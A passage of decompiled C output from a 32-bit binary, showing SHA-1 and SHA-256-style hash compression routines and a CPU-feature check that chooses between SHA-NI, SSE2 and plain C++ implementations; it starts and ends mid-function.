  v276 = v116 - 1894007588 + v251 + (v275 & v118 | v117 & (v275 | v118)) + __ROL4__(v287, 5);
  v120 = __ROR4__(v287, 2);
  v121 = v117 + v208 + (v287 & v119 | v118 & (v287 | v119)) + __ROL4__(v276, 5) - 1894007588;
  v256 = __ROL4__(v247 ^ v255 ^ v212 ^ v238, 1);
  v122 = __ROR4__(v276, 2);
  v199 = __ROL4__(v251 ^ v198 ^ v217 ^ v204, 1);
  v277 = __ROL4__(v121, 5) + v118 - 1894007588 + v256 + (v119 & (v120 | v276) | v120 & v276);
  v288 = __ROR4__(v121, 2);
  v213 = __ROL4__(v208 ^ v212 ^ v222 ^ v193, 1);
  v266 = v119 + v199 + (v121 & v122 | v120 & (v121 | v122)) + __ROL4__(v277, 5) - 1894007588;
  v123 = v277 & v288 | v122 & (v277 | v288);
  v278 = __ROR4__(v277, 2);
  v218 = __ROL4__(v256 ^ v217 ^ v226 ^ v294, 1);
  v260 = v120 + v213 + v123 + __ROL4__(v266, 5) - 1894007588;
  v124 = v266 & v278 | v288 & (v266 | v278);
  v267 = __ROR4__(v266, 2);
  v125 = v122 + v218 + v124 + __ROL4__(v260, 5) - 1894007588;
  v223 = __ROL4__(v242 ^ v199 ^ v222 ^ v230, 1);
  v126 = v260 & v267 | v278 & (v260 | v267);
  v261 = __ROR4__(v260, 2);
  v127 = v288 + v223 + v126 + __ROL4__(v125, 5) - 1894007588;
  v227 = __ROL4__(v247 ^ v213 ^ v226 ^ v234, 1);
  v128 = v261 & v125 | v267 & (v261 | v125);
  v129 = __ROR4__(v125, 2);
  v130 = v278 + v227 + v128 + __ROL4__(v127, 5) - 1894007588;
  v131 = v261 & (v127 | v129);
  v231 = __ROL4__(v251 ^ v218 ^ v230 ^ v238, 1);
  v132 = v127 & v129;
  v133 = __ROR4__(v127, 2);
  v134 = v267 + v231 + (v132 | v131) + __ROL4__(v130, 5) - 1894007588;
  v235 = __ROL4__(v208 ^ v223 ^ v234 ^ v204, 1);
  v135 = v130 & v133 | v129 & (v130 | v133);
  v136 = __ROR4__(v130, 2);
  v137 = v261 - 1894007588 + v235 + v135 + __ROL4__(v134, 5);
  v239 = __ROL4__(v256 ^ v227 ^ v238 ^ v193, 1);
  v138 = v134 ^ v136 ^ v133;
  v139 = __ROR4__(v134, 2);
  v140 = v129 + v239 + v138 + __ROL4__(v137, 5) - 899497514;
  v205 = __ROL4__(v199 ^ v231 ^ v204 ^ v294, 1);
  v141 = v137 ^ v139 ^ v136;
  v142 = __ROR4__(v137, 2);
  v143 = v133 + v205 + v141 + __ROL4__(v140, 5) - 899497514;
  v194 = __ROL4__(v242 ^ v213 ^ v235 ^ v193, 1);
  v144 = v142 ^ v139 ^ v140;
  v145 = __ROR4__(v140, 2);
  v146 = v136 + v194 + v144 + __ROL4__(v143, 5) - 899497514;
  v295 = __ROL4__(v247 ^ v218 ^ v239 ^ v294, 1);
  v147 = v142 ^ v143 ^ v145;
  v148 = __ROR4__(v143, 2);
  v149 = v139 + v295 + v147 + __ROL4__(v146, 5) - 899497514;
  v279 = __ROL4__(v242 ^ v251 ^ v223 ^ v205, 1);
  v150 = v146 ^ v148 ^ v145;
  v151 = __ROR4__(v146, 2);
  v152 = v142 + v279 + v150 + __ROL4__(v149, 5) - 899497514;
  v268 = __ROL4__(v247 ^ v208 ^ v227 ^ v194, 1);
  v153 = v149 ^ v151 ^ v148;
  v154 = __ROR4__(v149, 2);
  v155 = v145 + v268 + v153 + __ROL4__(v152, 5) - 899497514;
  v262 = __ROL4__(v251 ^ v256 ^ v231 ^ v295, 1);
  v156 = v152 ^ v154 ^ v151;
  v157 = __ROR4__(v152, 2);
  v158 = v148 + v262 + v156 + __ROL4__(v155, 5) - 899497514;
  v252 = __ROL4__(v279 ^ v208 ^ v199 ^ v235, 1);
  v159 = v157 ^ v154 ^ v155;
  v160 = __ROR4__(v155, 2);
  v161 = v151 + v252 + v159 + __ROL4__(v158, 5) - 899497514;
  v257 = __ROL4__(v268 ^ v256 ^ v213 ^ v239, 1);
  v162 = v157 ^ v158 ^ v160;
  v163 = __ROR4__(v158, 2);
  v164 = v154 + v257 + v162 + __ROL4__(v161, 5) - 899497514;
  v248 = __ROL4__(v262 ^ v199 ^ v218 ^ v205, 1);
  v165 = v161 ^ v163 ^ v160;
  v166 = __ROR4__(v161, 2);
  v167 = v157 + v248 + v165 + __ROL4__(v164, 5) - 899497514;
  v214 = __ROL4__(v252 ^ v213 ^ v223 ^ v194, 1);
  v168 = v160 + v214 + (v164 ^ v166 ^ v163);
  v169 = __ROR4__(v164, 2);
  v289 = __ROL4__(v167, 5) - 899497514 + v168;
  v219 = __ROL4__(v257 ^ v218 ^ v227 ^ v295, 1);
  v200 = __ROL4__(v289, 5) - 899497514 + v163 + v219 + (v167 ^ v169 ^ v166);
  v243 = __ROR4__(v167, 2);
  v170 = __ROL4__(v279 ^ v248 ^ v223 ^ v231, 1);
  v171 = v166 + v170 + (v243 ^ v169 ^ v289);
  v290 = __ROR4__(v289, 2);
  v172 = v171 + __ROL4__(v200, 5) - 899497514;
  v173 = v243 ^ v200 ^ v290;
  v201 = __ROR4__(v200, 2);
  v174 = __ROL4__(v268 ^ v214 ^ v227 ^ v235, 1);
  v175 = v169 + v174 + v173 + __ROL4__(v172, 5) - 899497514;
  v176 = __ROL4__(v262 ^ v219 ^ v231 ^ v239, 1);
  v177 = v243 + v176 + (v172 ^ v201 ^ v290);
  v244 = __ROR4__(v172, 2);
  v178 = v170 ^ v235 ^ v205;
  v179 = __ROL4__(v175, 5) - 899497514 + v177;
  v180 = __ROL4__(v252 ^ v178, 1);
  v181 = v290 + v180 + (v175 ^ v244 ^ v201) + __ROL4__(v179, 5) - 899497514;
  v291 = __ROR4__(v175, 2);
  v253 = v181;
  v182 = __ROL4__(v257 ^ v174 ^ v239 ^ v194, 1);
  v183 = v201 + v182 + (v179 ^ v291 ^ v244) + __ROL4__(v181, 5) - 899497514;
  v184 = __ROL4__(v248 ^ v176 ^ v205 ^ v295, 1);
  v263 = __ROR4__(v179, 2);
  v185 = __ROR4__(v253, 2);
  v186 = __ROL4__(v183, 5) + v184 + v244 + (v291 ^ v253 ^ v263) - 899497514;
  v187 = v183 ^ v185;
  v188 = __ROR4__(v183, 2);
  v189 = v291 + (v263 ^ v187) - 899497514 + __ROL4__(v186, 5) + __ROL4__(v279 ^ v214 ^ v194 ^ v180, 1);
  a1[3] += v188;
  a1[1] += v189;
  result = v263 + __ROL4__(v268 ^ v219 ^ v182 ^ v295, 1) + __ROL4__(v189, 5) + *a1 + (v186 ^ v188 ^ v185) - 899497514;
  a1[2] += __ROR4__(v186, 2);
  a1[4] += v185;
  *a1 = result;
  return result;
}

//----- (0045D360) --------------------------------------------------------
int __cdecl sub_45D360(int a1)
{
  char v1; // al

  v1 = byte_4F0124;
  if ( !byte_4F0124 )
  {
    sub_466590();
    v1 = byte_4F0124;
  }
  if ( byte_4F012D )
  {
    sub_419B80(a1, "SHANI");
    return a1;
  }
  else
  {
    if ( !v1 )
      sub_466590();
    if ( byte_4F0125 )
      sub_419B80(a1, "SSE2");
    else
      sub_419B80(a1, "C++");
    return a1;
  }
}
// 4F0124: using guessed type char byte_4F0124;
// 4F0125: using guessed type char byte_4F0125;
// 4F012D: using guessed type char byte_4F012D;

//----- (0045D3D0) --------------------------------------------------------
int __cdecl sub_45D3D0(__int128 *a1, unsigned int *a2)
{
  unsigned int v2; // ecx
  unsigned int v3; // ebp
  int v4; // esi
  int v5; // edi
  unsigned int v6; // eax
  int v7; // edx
  int v8; // edx
  unsigned int v9; // eax
  int v10; // esi
  unsigned int v11; // eax
  int v12; // esi
  int v13; // edx
  unsigned int v14; // eax
  int v15; // edx
  int v16; // esi
  unsigned int v17; // eax
  int v18; // edx
  unsigned int v19; // eax
  int v20; // edx
  unsigned int v21; // eax
  int v22; // edx
  int v23; // esi
  unsigned int v24; // eax
  int v25; // esi
  unsigned int v26; // edx
  unsigned int v27; // eax
  int v28; // edi
  unsigned int v29; // edx
  unsigned int v30; // eax
  int v31; // esi
  int v32; // edx
  unsigned int v33; // eax
  int v34; // edx
  unsigned int v35; // eax
  unsigned int v36; // edx
  unsigned int v37; // eax
  unsigned int v38; // edx
  unsigned int v39; // eax
  int v40; // edx
  unsigned int v41; // eax
  int v42; // ecx
  int v43; // edx
  __int128 *v44; // edx
  int result; // eax
  int v46; // [esp+10h] [ebp-C8h]
  int v47; // [esp+10h] [ebp-C8h]
  int v48; // [esp+10h] [ebp-C8h]
  int v49; // [esp+14h] [ebp-C4h]
  int v50; // [esp+14h] [ebp-C4h]
  int v51; // [esp+14h] [ebp-C4h]
  int v52; // [esp+14h] [ebp-C4h]
  int v53; // [esp+18h] [ebp-C0h]
  int v54; // [esp+18h] [ebp-C0h]
  int v55; // [esp+18h] [ebp-C0h]
  int v56; // [esp+1Ch] [ebp-BCh]
  int v57; // [esp+1Ch] [ebp-BCh]
  int v58; // [esp+1Ch] [ebp-BCh]
  int v59; // [esp+20h] [ebp-B8h]
  int v60; // [esp+20h] [ebp-B8h]
  int v61; // [esp+20h] [ebp-B8h]
  int v62; // [esp+24h] [ebp-B4h]
  int v63; // [esp+24h] [ebp-B4h]
  unsigned int v64; // [esp+24h] [ebp-B4h]
  int v65; // [esp+28h] [ebp-B0h]
  unsigned int v66; // [esp+28h] [ebp-B0h]
  int v67; // [esp+2Ch] [ebp-ACh]
  int v68; // [esp+2Ch] [ebp-ACh]
  int v69; // [esp+30h] [ebp-A8h]
  int v70; // [esp+34h] [ebp-A4h]
  int v71; // [esp+34h] [ebp-A4h]
  unsigned int v72; // [esp+38h] [ebp-A0h]
  unsigned int v73; // [esp+3Ch] [ebp-9Ch]
  unsigned int v74; // [esp+40h] [ebp-98h]
  unsigned int v75; // [esp+44h] [ebp-94h]
  unsigned int v76; // [esp+48h] [ebp-90h]
  unsigned int v77; // [esp+4Ch] [ebp-8Ch]
  unsigned int v78; // [esp+50h] [ebp-88h]
  unsigned int v79; // [esp+54h] [ebp-84h]
  unsigned int v80; // [esp+58h] [ebp-80h]
  unsigned int v81; // [esp+5Ch] [ebp-7Ch]
  unsigned int v82; // [esp+60h] [ebp-78h]
  unsigned int v83; // [esp+64h] [ebp-74h]
  unsigned int v84; // [esp+68h] [ebp-70h]
  unsigned int v85; // [esp+6Ch] [ebp-6Ch]
  unsigned int v86; // [esp+70h] [ebp-68h]
  unsigned int v87; // [esp+74h] [ebp-64h]
  __int128 v88; // [esp+78h] [ebp-60h] BYREF
  __int128 v89; // [esp+88h] [ebp-50h]
  int v90[16]; // [esp+98h] [ebp-40h] BYREF

  memset(v90, 0, sizeof(v90));
  v2 = v90[1];
  v3 = 0;
  v80 = v90[1];
  v88 = *a1;
  v4 = DWORD2(v88);
  v79 = v90[15];
  v77 = v90[14];
  v78 = v90[13];
  v72 = v90[12];
  v75 = v90[11];
  v5 = v88;
  v84 = v90[10];
  v83 = v90[9];
  v87 = v90[8];
  v85 = v90[7];
  v76 = v90[6];
  v74 = v90[5];
  v73 = v90[4];
  v82 = v90[3];
  v81 = v90[2];
  v86 = v90[0];
  v89 = a1[1];
  v62 = DWORD1(v88);
  do
  {
    if ( v3 )
      v6 = v83
         + ((v2 >> 3) ^ __ROR4__(v2, 7) ^ __ROL4__(v2, 14))
         + ((v77 >> 10) ^ __ROL4__(v77, 13) ^ __ROL4__(v77, 15))
         + v86;
    else
      v6 = *a2;
    v86 = v6;
    v7 = HIDWORD(v89)
       + SHA512_Constants_4BC310[v3]
       + (DWORD2(v89) ^ v89 & (DWORD2(v89) ^ DWORD1(v89)))
       + (__ROR4__(v89, 6) ^ __ROL4__(v89, 7) ^ __ROR4__(v89, 11))
       + v6;
    v49 = v7 + HIDWORD(v88);
    v53 = v7 + (__ROR4__(v5, 2) ^ __ROL4__(v5, 10) ^ __ROR4__(v5, 13)) + (v62 ^ (v5 ^ v62) & (v4 ^ v62));
    if ( v3 )
      v80 += v84
           + ((v81 >> 3) ^ __ROR4__(v81, 7) ^ __ROL4__(v81, 14))
           + ((v79 >> 10) ^ __ROL4__(v79, 13) ^ __ROL4__(v79, 15));
    else
      v80 = a2[1];
    v8 = DWORD2(v89)
       + SHA512_Constants_4BC314[v3]
       + (DWORD1(v89) ^ v49 & (v89 ^ DWORD1(v89)))
       + (__ROR4__(v49, 6) ^ __ROL4__(v49, 7) ^ __ROR4__(v49, 11))
       + v80;
    v46 = v8 + v4;
    v56 = v8 + (__ROR4__(v53, 2) ^ __ROL4__(v53, 10) ^ __ROR4__(v53, 13)) + (v5 ^ (v5 ^ v62) & (v5 ^ v53));
    if ( v3 )
      v9 = v75
         + ((v6 >> 10) ^ __ROL4__(v6, 13) ^ __ROL4__(v6, 15))
         + ((v82 >> 3) ^ __ROR4__(v82, 7) ^ __ROL4__(v82, 14))
         + v81;
    else
      v9 = a2[2];
    v81 = v9;
    v10 = DWORD1(v89)
        + SHA512_Constants_4BC318[v3]
        + (v89 ^ v46 & (v89 ^ v49))
        + (__ROR4__(v46, 6) ^ __ROL4__(v46, 7) ^ __ROR4__(v46, 11))
        + v9;
    v70 = v10 + v62;
    v59 = v10 + (__ROR4__(v56, 2) ^ __ROL4__(v56, 10) ^ __ROR4__(v56, 13)) + (v53 ^ (v53 ^ v5) & (v56 ^ v53));
    if ( v3 )
      v11 = v72
          + ((v80 >> 10) ^ __ROL4__(v80, 13) ^ __ROL4__(v80, 15))
          + ((v73 >> 3) ^ __ROR4__(v73, 7) ^ __ROL4__(v73, 14))
          + v82;
    else
      v11 = a2[3];
    v82 = v11;
    v12 = v53;
    v13 = v89
        + SHA512_Constants_4BC31C[v3]
        + (v49 ^ v70 & (v49 ^ v46))
        + (__ROR4__(v70, 6) ^ __ROL4__(v70, 7) ^ __ROR4__(v70, 11))
        + v11;
    v67 = v13 + v5;
    v54 = v13 + (__ROR4__(v59, 2) ^ __ROL4__(v59, 10) ^ __ROR4__(v59, 13)) + (v56 ^ (v56 ^ v59) & (v53 ^ v56));
    if ( v3 )
      v14 = v78
          + ((v81 >> 10) ^ __ROL4__(v81, 13) ^ __ROL4__(v81, 15))
          + ((v74 >> 3) ^ __ROR4__(v74, 7) ^ __ROL4__(v74, 14))
          + v73;
    else
      v14 = a2[4];
    v73 = v14;
    v15 = v49
        + dword_4BC320[v3]
        + (v46 ^ v67 & (v46 ^ v70))
        + (__ROR4__(v67, 6) ^ __ROL4__(v67, 7) ^ __ROR4__(v67, 11))
        + v14;
    v16 = v15 + v12;
    v65 = v16;
    v63 = v15 + (__ROR4__(v54, 2) ^ __ROL4__(v54, 10) ^ __ROR4__(v54, 13)) + (v59 ^ (v56 ^ v59) & (v59 ^ v54));
    if ( v3 )
      v17 = v77
          + ((v76 >> 3) ^ __ROR4__(v76, 7) ^ __ROL4__(v76, 14))
          + ((v82 >> 10) ^ __ROL4__(v82, 13) ^ __ROL4__(v82, 15))
          + v74;
    else
      v17 = a2[5];
    v74 = v17;
    v18 = v46
        + dword_4BC324[v3]
        + (v70 ^ v16 & (v70 ^ v67))
        + (__ROR4__(v16, 6) ^ __ROL4__(v16, 7) ^ __ROR4__(v16, 11))
        + v17;
    v47 = v18 + v56;
    v50 = v18 + (__ROR4__(v63, 2) ^ __ROL4__(v63, 10) ^ __ROR4__(v63, 13)) + (v54 ^ (v59 ^ v54) & (v54 ^ v63));
    if ( v3 )
      v19 = v79
          + ((v85 >> 3) ^ __ROR4__(v85, 7) ^ __ROL4__(v85, 14))
          + ((v73 >> 10) ^ __ROL4__(v73, 13) ^ __ROL4__(v73, 15))
          + v76;
    else
      v19 = a2[6];
    v76 = v19;
    v20 = v70
        + dword_4BC328[v3]
        + (v67 ^ v47 & (v16 ^ v67))
        + (__ROR4__(v47, 6) ^ __ROL4__(v47, 7) ^ __ROR4__(v47, 11))
        + v19;
    v71 = v20 + v59;
    v69 = v20 + (__ROR4__(v50, 2) ^ __ROL4__(v50, 10) ^ __ROR4__(v50, 13)) + (v63 ^ (v54 ^ v63) & (v63 ^ v50));
    if ( v3 )
      v21 = v86
          + ((v87 >> 3) ^ __ROR4__(v87, 7) ^ __ROL4__(v87, 14))
          + ((v74 >> 10) ^ __ROL4__(v74, 13) ^ __ROL4__(v74, 15))
          + v85;
    else
      v21 = a2[7];
    v85 = v21;
    v22 = v67
        + dword_4BC32C[v3]
        + (v16 ^ (v20 + v59) & (v16 ^ v47))
        + (__ROR4__(v20 + v59, 6) ^ __ROL4__(v20 + v59, 7) ^ __ROR4__(v20 + v59, 11))
        + v21;
    v60 = v22 + v54;
    v23 = v22 + (__ROR4__(v69, 2) ^ __ROL4__(v69, 10) ^ __ROR4__(v69, 13)) + (v50 ^ (v63 ^ v50) & (v50 ^ v69));
    v57 = v23;
    if ( v3 )
      v24 = v80
          + ((v83 >> 3) ^ __ROR4__(v83, 7) ^ __ROL4__(v83, 14))
          + ((v76 >> 10) ^ __ROL4__(v76, 13) ^ __ROL4__(v76, 15))
          + v87;
    else
      v24 = a2[8];
    v87 = v24;
    v25 = v69 ^ v23;
    v26 = v65
        + dword_4BC330[v3]
        + (v47 ^ v60 & (v71 ^ v47))
        + (__ROR4__(v60, 6) ^ __ROL4__(v60, 7) ^ __ROR4__(v60, 11))
        + v24;
    v64 = v26 + v63;
    v55 = (v69 ^ v25 & (v50 ^ v69)) + v26 + (__ROL4__(v57, 10) ^ __ROR4__(v57, 13) ^ __ROR4__(v57, 2));
    if ( v3 )
      v27 = v81
          + ((v85 >> 10) ^ __ROL4__(v85, 13) ^ __ROL4__(v85, 15))
          + ((v84 >> 3) ^ __ROR4__(v84, 7) ^ __ROL4__(v84, 14))
          + v83;
    else
      v27 = a2[9];
    v83 = v27;
    v28 = v57;
    v29 = v47
        + dword_4BC334[v3]
        + (v71 ^ v64 & (v60 ^ v71))
        + (__ROR4__(v64, 6) ^ __ROL4__(v64, 7) ^ __ROR4__(v64, 11))
        + v27;
    v66 = v29 + v50;
    v51 = v55 ^ v57;
    v58 = (v57 ^ (v55 ^ v57) & v25) + v29 + (__ROL4__(v55, 10) ^ __ROR4__(v55, 13) ^ __ROR4__(v55, 2));
    if ( v3 )
      v30 = v82
          + ((v87 >> 10) ^ __ROL4__(v87, 13) ^ __ROL4__(v87, 15))
          + ((v75 >> 3) ^ __ROR4__(v75, 7) ^ __ROL4__(v75, 14))
          + v84;
    else
      v30 = a2[10];
    v84 = v30;
    v31 = v60;
    v32 = v71
        + dword_4BC338[v3]
        + (v60 ^ v66 & (v64 ^ v60))
        + (__ROR4__(v66, 6) ^ __ROL4__(v66, 7) ^ __ROR4__(v66, 11))
        + v30;
    v48 = v32 + v69;
    v61 = v32 + (__ROR4__(v58, 2) ^ __ROL4__(v58, 10) ^ __ROR4__(v58, 13)) + (v55 ^ v51 & (v55 ^ v58));
    if ( v3 )
      v33 = v73
          + ((v83 >> 10) ^ __ROL4__(v83, 13) ^ __ROL4__(v83, 15))
          + ((v72 >> 3) ^ __ROR4__(v72, 7) ^ __ROL4__(v72, 14))
          + v75;
    else
      v33 = a2[11];
    v75 = v33;
    v34 = v31
        + dword_4BC33C[v3]
        + (v64 ^ v48 & (v66 ^ v64))
        + (__ROR4__(v48, 6) ^ __ROL4__(v48, 7) ^ __ROR4__(v48, 11))
        + v33;
    v68 = v28 + v34;
    v52 = v34 + (__ROR4__(v61, 2) ^ __ROL4__(v61, 10) ^ __ROR4__(v61, 13)) + (v58 ^ (v55 ^ v58) & (v58 ^ v61));
    if ( v3 )
      v35 = v74
          + ((v78 >> 3) ^ __ROR4__(v78, 7) ^ __ROL4__(v78, 14))
          + ((v84 >> 10) ^ __ROL4__(v84, 13) ^ __ROL4__(v84, 15))
          + v72;
    else
      v35 = a2[12];
    v72 = v35;
    v36 = v64
        + dword_4BC340[v3]
        + (v66 ^ v68 & (v48 ^ v66))
        + (__ROR4__(v68, 6) ^ __ROL4__(v68, 7) ^ __ROR4__(v68, 11))
        + v35;
    HIDWORD(v89) = v36 + v55;
    HIDWORD(v88) = v36 + (__ROR4__(v52, 2) ^ __ROL4__(v52, 10) ^ __ROR4__(v52, 13)) + (v61 ^ (v58 ^ v61) & (v61 ^ v52));
    if ( v3 )
      v37 = v76
          + ((v77 >> 3) ^ __ROR4__(v77, 7) ^ __ROL4__(v77, 14))
          + ((v75 >> 10) ^ __ROL4__(v75, 13) ^ __ROL4__(v75, 15))
          + v78;
    else
      v37 = a2[13];
    v78 = v37;
    v38 = v66
        + dword_4BC344[v3]
        + (v48 ^ (v36 + v55) & (v48 ^ v68))
        + (__ROR4__(v36 + v55, 6) ^ __ROL4__(v36 + v55, 7) ^ __ROR4__(v36 + v55, 11))
        + v37;
    DWORD2(v89) = v38 + v58;
    v4 = v38
       + (__ROR4__(HIDWORD(v88), 2) ^ __ROL4__(HIDWORD(v88), 10) ^ __ROR4__(HIDWORD(v88), 13))
       + (v52 ^ (v61 ^ v52) & (HIDWORD(v88) ^ v52));
    if ( v3 )
      v39 = v85
          + ((v79 >> 3) ^ __ROR4__(v79, 7) ^ __ROL4__(v79, 14))
          + ((v72 >> 10) ^ __ROL4__(v72, 13) ^ __ROL4__(v72, 15))
          + v77;
    else
      v39 = a2[14];
    v77 = v39;
    v40 = v48
        + dword_4BC348[v3]
        + (v68 ^ (v38 + v58) & (HIDWORD(v89) ^ v68))
        + (__ROR4__(v38 + v58, 6) ^ __ROL4__(v38 + v58, 7) ^ __ROR4__(v38 + v58, 11))
        + v39;
    DWORD1(v89) = v40 + v61;
    v62 = v40
        + (__ROR4__(v4, 2) ^ __ROL4__(v4, 10) ^ __ROR4__(v4, 13))
        + (HIDWORD(v88) ^ (HIDWORD(v88) ^ v52) & (v4 ^ HIDWORD(v88)));
    DWORD1(v88) = v62;
    if ( v3 )
      v41 = v87
          + ((v86 >> 3) ^ __ROR4__(v86, 7) ^ __ROL4__(v86, 14))
          + ((v78 >> 10) ^ __ROL4__(v78, 13) ^ __ROL4__(v78, 15))
          + v79;
    else
      v41 = a2[15];
    v79 = v41;
    v42 = dword_4BC34C[v3]
        + (HIDWORD(v89) ^ DWORD1(v89) & (DWORD2(v89) ^ HIDWORD(v89)))
        + (__ROR4__(DWORD1(v89), 6) ^ __ROL4__(DWORD1(v89), 7) ^ __ROR4__(DWORD1(v89), 11));
    v3 += 16;
    v43 = v68 + v42 + v41;
    LODWORD(v89) = v43 + v52;
    v5 = v43 + (__ROR4__(v62, 2) ^ __ROL4__(v62, 10) ^ __ROR4__(v62, 13)) + (v4 ^ (v4 ^ HIDWORD(v88)) & (v4 ^ v62));
    v2 = v80;
  }
  while ( v3 < 0x40 );
  v44 = a1;
  LODWORD(v88) = v5;
  DWORD2(v88) = v4;
  result = 2;
  do
  {
    ++v44;
    *(v44 - 1) = (__int128)_mm_add_epi32(
                             *(__m128i *)((char *)v44 + (char *)&v88 - (char *)a1 - 16),
                             *((__m128i *)v44 - 1));
    --result;
  }
  while ( result );
  return result;
}
// 4BC310: using guessed type int SHA512_Constants_4BC310[];
// 4BC314: using guessed type int SHA512_Constants_4BC314[];
// 4BC318: using guessed type int SHA512_Constants_4BC318[];
// 4BC31C: using guessed type int SHA512_Constants_4BC31C[];
// 4BC320: using guessed type int dword_4BC320[];
// 4BC324: using guessed type int dword_4BC324[];
// 4BC328: using guessed type int dword_4BC328[];
// 4BC32C: using guessed type int dword_4BC32C[];
// 4BC330: using guessed type int dword_4BC330[];
// 4BC334: using guessed type int dword_4BC334[];
// 4BC338: using guessed type int dword_4BC338[];
// 4BC33C: using guessed type int dword_4BC33C[];
// 4BC340: using guessed type int dword_4BC340[];
// 4BC344: using guessed type int dword_4BC344[];
// 4BC348: using guessed type int dword_4BC348[];
// 4BC34C: using guessed type int dword_4BC34C[33];

//----- (0045E0F0) --------------------------------------------------------
int __fastcall sub_45E0F0(const __m128i *a1, unsigned int *a2, int a3)
{
  _DWORD *v3; // esi
  __m128i v4; // xmm0
  __m128i v5; // xmm1
  int v6; // edi
  int v7; // edx
  int v8; // ebx
  int v9; // edx
  int v10; // edi
  int v11; // ebx
  int v12; // edi
  int v13; // edx
  int v14; // ebx
  int v15; // edx
  int v16; // edi
  int v17; // ebx
  int v18; // edi
  int v19; // edx
  int v20; // ebx
  int v21; // edx
  int v22; // edi
  int v23; // ebx
  int v24; // edi
  int v25; // edx
  int v26; // ebx
  int v27; // edx
  int v28; // edi
  int v29; // ebx
  int v30; // edi
  int v31; // edx
  int v32; // ebx
  int v33; // edx
  int v34; // edi
  int v35; // ebx
  int v36; // edi
  int v37; // edx
  int v38; // ebx
  int v39; // edx
  int v40; // edi
  int v41; // ebx
  int v42; // edi
  int v43; // edx
  int v44; // ebx
  int v45; // edx
  int v46; // edi
  int v47; // ebx
  int v48; // edi
  int v49; // edx
  int v50; // ebx
  int v51; // edx
  int v52; // edi
  int result; // eax
  int v54; // ebx
  int v55; // ecx
  int v56; // edi
  int v57; // ecx
  int v58; // edx
  int v59; // ebp
  int v60; // edi
  int v61; // edx
  int v62; // ebx
  int v63; // edi
  int v64; // edx
  unsigned int v65; // edx
  int v66; // ebx
  int v67; // ecx
  int v68; // ebp
  int v69; // ebx
  int v70; // edx
  int v71; // edi
  int v72; // ebx
  int v73; // edx
  int v74; // edi
  unsigned int v75; // edi
  int v76; // ebx
  int v77; // edi
  int v78; // edx
  int v79; // ebx
  int v80; // edi
  int v81; // edx
  unsigned int v82; // edx
  int v83; // ebx
  int v84; // edx
  int v85; // edi
  int v86; // ebx
  int v87; // edx
  int v88; // edi
  unsigned int v89; // edi
  int v90; // ebx
  int v91; // edi
  int v92; // edx
  int v93; // ebx
  int v94; // edi
  int v95; // edx
  unsigned int v96; // edx
  int v97; // ebx
  int v98; // edx
  int v99; // edi
  int v100; // ebx
  int v101; // edx
  int v102; // edi
  unsigned int v103; // edi
  int v104; // ebx
  int v105; // edi
  int v106; // edx
  int v107; // ebx
  int v108; // edi
  int v109; // edx
  unsigned int v110; // edx
  int v111; // ebx
  int v112; // edx
  int v113; // edi
  int v114; // ebx
  int v115; // edx
  int v116; // edi
  unsigned int v117; // edi
  int v118; // ebx
  int v119; // edi
  int v120; // edx
  int v121; // ebx
  int v122; // edi
  int v123; // edx
  unsigned int v124; // edx
  int v125; // ebx
  int v126; // edx
  int v127; // edi
  int v128; // ebx
  int v129; // edx
  int v130; // edi
  unsigned int v131; // edi
  int v132; // ebx
  int v133; // edi
  int v134; // edx
  int v135; // ebx
  int v136; // edi
  int v137; // edx
  unsigned int v138; // edx
  int v139; // ebx
  int v140; // edx
  int v141; // edi
  int v142; // ebx
  int v143; // edx
  int v144; // edi
  unsigned int v145; // edi
  int v146; // ebx
  int v147; // edi
  int v148; // edx
  int v149; // ebx
  int v150; // edi
  int v151; // edx
  unsigned int v152; // edx
  int v153; // ebx
  int v154; // edx
  int v155; // edi
  int v156; // ebx
  int v157; // edx
  int v158; // edi
  unsigned int v159; // edi
  int v160; // ebx
  int v161; // edi
  int v162; // edx
  int v163; // ebx
  int v164; // edi
  int v165; // edx
  unsigned int v166; // edx
  int v167; // ebx
  int v168; // edx
  int v169; // edi
  int v170; // ebx
  int v171; // edx
  int v172; // edi
  unsigned int v173; // edi
  int v174; // ebx
  unsigned int v175; // ecx
  __m128i *v176; // ebp
  int v177; // ecx
  int v178; // ebx
  int v179; // ebx
  int v180; // ecx
  __int128 v181[2]; // [esp+0h] [ebp-80h] BYREF
  unsigned int v182; // [esp+20h] [ebp-60h]
  unsigned int v183; // [esp+24h] [ebp-5Ch]
  unsigned int v184; // [esp+28h] [ebp-58h]
  unsigned int v185; // [esp+2Ch] [ebp-54h]
  unsigned int v186; // [esp+30h] [ebp-50h]
  unsigned int v187; // [esp+34h] [ebp-4Ch]
  unsigned int v188; // [esp+38h] [ebp-48h]
  unsigned int v189; // [esp+3Ch] [ebp-44h]
  unsigned int v190; // [esp+40h] [ebp-40h]
  unsigned int v191; // [esp+44h] [ebp-3Ch]
  unsigned int v192; // [esp+48h] [ebp-38h]
  unsigned int v193; // [esp+4Ch] [ebp-34h]
  unsigned int v194; // [esp+50h] [ebp-30h]
  unsigned int v195; // [esp+54h] [ebp-2Ch]
  unsigned int v196; // [esp+58h] [ebp-28h]
  unsigned int v197; // [esp+5Ch] [ebp-24h]
  unsigned int v198; // [esp+60h] [ebp-20h]
  __m128i *v199; // [esp+64h] [ebp-1Ch]
  unsigned int *v200; // [esp+68h] [ebp-18h]
  unsigned int v201; // [esp+6Ch] [ebp-14h]
  int *v202; // [esp+70h] [ebp-10h]
  int vars0; // [esp+80h] [ebp+0h] BYREF

  v3 = &unk_4BC3D0;
  v202 = &vars0;
  v199 = (__m128i *)a1;
  v200 = a2;
  v201 = (unsigned int)a2 + a3;
  v198 = (unsigned int)&unk_4BC3D0;
  if ( (a3 & 1) != 0 )
    goto LABEL_3;
  --v198;
  v4 = _mm_loadu_si128(a1);
  v5 = _mm_loadu_si128(a1 + 1);
  do
  {
    v181[1] = (__int128)v5;
    v181[0] = (__int128)v4;
    while ( 1 )
    {
      v3 -= 48;
      v197 = _byteswap_ulong(*a2);
      v196 = _byteswap_ulong(a2[1]);
      v195 = _byteswap_ulong(a2[2]);
      v194 = _byteswap_ulong(a2[3]);
      v193 = _byteswap_ulong(a2[4]);
      v192 = _byteswap_ulong(a2[5]);
      v191 = _byteswap_ulong(a2[6]);
      v190 = _byteswap_ulong(a2[7]);
      v189 = _byteswap_ulong(a2[8]);
      v188 = _byteswap_ulong(a2[9]);
      v187 = _byteswap_ulong(a2[10]);
      v186 = _byteswap_ulong(a2[11]);
      v185 = _byteswap_ulong(a2[12]);
      v184 = _byteswap_ulong(a2[13]);
      v183 = _byteswap_ulong(a2[14]);
      v182 = _byteswap_ulong(a2[15]);
